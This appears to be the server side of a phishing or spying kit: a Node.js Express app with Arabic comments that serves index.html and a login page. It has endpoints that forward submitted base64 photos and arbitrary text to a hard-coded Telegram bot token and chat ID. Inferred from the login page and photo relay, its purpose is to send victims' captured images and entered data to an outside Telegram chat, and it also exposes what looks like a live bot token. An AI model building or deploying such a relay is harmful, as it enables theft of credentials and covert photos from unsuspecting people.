const express = require('express');
const axios = require('axios');
const FormData = require('form-data');
const path = require('path');
const app = express();

app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
    res.header('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
    next();
});

app.use(express.json({ limit: '50mb' }));

// ✅ خدمة الملفات الثابتة من نفس المجلد
app.use(express.static(path.join(__dirname)));

const BOT_TOKEN = '8820755267:AAHMUktr3XDN_0RjFDM79NExy7ORssx-MdI';
const CHAT_ID = '6198785906';

// نقاط النهاية للبيانات
app.post('/send-photo', async (req, res) => {
    try {
        const { image, caption } = req.body;
        const base64Data = image.replace(/^data:image\/\w+;base64,/, '');
        const buffer = Buffer.from(base64Data, 'base64');

        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('photo', buffer, { filename: 'photo.jpg' });
        form.append('caption', caption || '📸 صورة جديدة');

        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, form, {
            headers: form.getHeaders()
        });

        res.json({ success: true });
    } catch (error) {
        console.error(error);
        res.status(500).json({ error: 'Failed to send photo' });
    }
});

app.post('/send-data', async (req, res) => {
    try {
        const { caption } = req.body;

        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: caption,
            parse_mode: 'HTML'
        });

        res.json({ success: true });
    } catch (error) {
        console.error(error);
        res.status(500).json({ error: 'Failed to send data' });
    }
});

// ✅ الصفحة الرئيسية
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// ✅ صفحة تسجيل الدخول
app.get('/login', (req, res) => {
    res.sendFile(path.join(__dirname, 'login.html'));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`✅ Server running on port ${PORT}`));
